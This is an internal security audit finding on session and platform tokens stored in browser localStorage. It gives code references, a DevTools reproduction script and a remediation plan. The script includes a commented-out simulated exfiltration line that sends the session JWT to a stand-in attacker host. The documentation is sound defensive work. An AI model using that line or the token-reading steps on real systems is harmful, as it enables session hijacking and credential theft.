# SEC-10 — Session/auth tokens readable by JavaScript (reproduction evidence)

- **Finding:** SEC-10 (Critical) — "Session JWT + auth context in `localStorage`".
- **Jira:** ETP-4575 (remediation) · Epic ETP-3504 · PRD WS-1.
- **Status:** Confirmed in code (2026-07-23). Live capture pending against the current deployment.
- **Invariant violated:** *"a browser script cannot read or replay a session credential"* (PRD §2, invariant 1).

## Claim

Both browser-held credentials are stored in `window.localStorage` and are therefore readable by
**any** script running on the origin. Combined with the absence of a CSP (SEC-08), a single XSS
yields full session theft (platform account + environment session).

## Code evidence (paths relative to `schema_forge_core/`)

1. **Environment/session token (`sf_auth_token`) — the SWS JWT.**
   - Persisted to `window.localStorage` by `createLocalAuthStorage()` —
     `packages/app-shell-core/src/auth/session.js:68-95` (storage backend is `window.localStorage`,
     `session.js:14-17`). Keys map: `sf_auth_token`, `sf_auth_user`, `sf_auth_client_id`,
     `sf_auth_rolelist`, `sf_auth_selected_role`, `sf_auth_selected_org` (`session.js:1-10`).
   - Sent back to the API as `Authorization: Bearer <sf_auth_token>` by `buildHeaders()` —
     `packages/app-shell-core/src/auth/api.js:20-22`.

2. **Platform token (`sf_platform_token`) — opaque account token.**
   - Written to `localStorage` on password login / register —
     functional host `LoginStep.jsx:66-68`, `RegisterStep.jsx:42-43`
     (keys `sf_platform_token`, `sf_platform_auth_method`).

3. **No mitigating control on the client.**
   - `isTokenExpired()` is a stub (`api.js:26-28`, `return !token;`) — no expiry enforcement.
   - No `HttpOnly` cookie anywhere; tokens live only in JS-readable Web Storage.

4. **Backend confirms the tokens are the auth contract** (not `JSESSIONID`):
   - Platform token issued in the JSON body of `/sws/go/login` —
     `modules/com.etendoerp.go/.../EtendoGoJwtServlet.java` (`generateToken` at `:1809`,
     returned by `handleLogin` at `:348-405`).
   - Environment JWT issued by `GET /sws/go/login?userId=` —
     `EtendoGoJwtServlet.java:1209` (`SecureWebServicesUtils.generateToken`).

## Live reproduction (to capture against the current deployment)

Run in the browser DevTools console after logging in and entering an environment:

```js
// 1) Both credential families are present in localStorage and enumerable by any script:
Object.keys(localStorage).filter(k => k.startsWith('sf_auth_') || k.startsWith('sf_platform_'));
//    → ["sf_auth_token","sf_auth_user","sf_auth_client_id","sf_auth_rolelist",
//       "sf_auth_selected_role","sf_auth_selected_org","sf_platform_token","sf_platform_auth_method", ...]

// 2) The environment session JWT is readable in clear (this is what an XSS would exfiltrate):
localStorage.getItem('sf_auth_token');      // e.g. "eyJhbGciOiJIUzI1NiJ9.<~480 chars>"

// 3) The platform account token is readable in clear:
localStorage.getItem('sf_platform_token');  // e.g. 32-hex opaque string

// 4) Simulated exfiltration (proof of replay-ability — DO NOT run against a real endpoint):
//    fetch('https://attacker.example/steal?t=' + localStorage.getItem('sf_auth_token'));
```

**Expected capture:** screenshot of steps (1)–(3) returning non-empty values, attached to
ETP-4575. Note the deployment host and date on the screenshot (PRD requires re-verification against
the current environment).

## Remediation

Closed by ETP-4575 (backend `__Host-` `HttpOnly` opaque cookie session — see
[ADR-0001](../adr/0001-backend-managed-session.md)) + ETP-4576 (frontend removes Bearer
construction and purges all `sf_auth_*` / `sf_platform_*` keys). After remediation, steps (1)–(3)
must return an empty array / `null`, and the session credential must not appear in `localStorage`,
`sessionStorage`, IndexedDB, JS-readable cookies, URLs, or telemetry.
